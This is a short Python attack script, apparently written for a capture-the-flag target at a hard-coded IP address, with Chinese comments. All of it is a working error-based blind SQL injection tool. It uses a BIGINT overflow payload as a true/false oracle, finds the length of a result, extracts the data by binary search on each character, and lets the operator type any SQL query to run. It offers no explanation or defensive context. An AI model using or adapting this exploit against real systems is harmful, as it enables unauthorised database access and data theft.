from requests import get
from urllib.parse import quote

payload = """' and (select( 9223372036854775807 + ({})));#"""
 

url = "http://120.78.142.81:49495/"

 


#wtf 主查询
#注释用 #？
# quote 居然不encode +
def check(payload,poc):
    data = {"id":quote(payload.format(poc)).replace("+","%2b")}
    res = get(url,params=data).content.decode('utf-8')
    if "out of range" in res :
        return 1
    else:
        print(data)
        return 0

def get_length(cmd):
    for n in range(100):
        poc = "length({}) = {}".format(cmd,n)
        
        if check(payload,poc) == 1:
        
            print(n)
            return n

def get_data(cmd,length):
    result = ''
    for n in range(1,length + 1):
        #爆破每一位
        begin = 0
        end = 128
        
        while(begin != end):
        
            if (begin + 1 == end):
                begin = begin + 1
            test = (begin + end )//2
            poc = ' ascii(substr(({}),{},1)) >{}' .format(cmd,n,test)
            print(poc)
            if (check(payload,poc) == 1):
                begin = test
            else :
                end = test
        result += chr(begin)

    print(f"result:{result}")


                




while 1:
    cmd = input("cmd: ")
    length = get_length(cmd)
    get_data(cmd,length)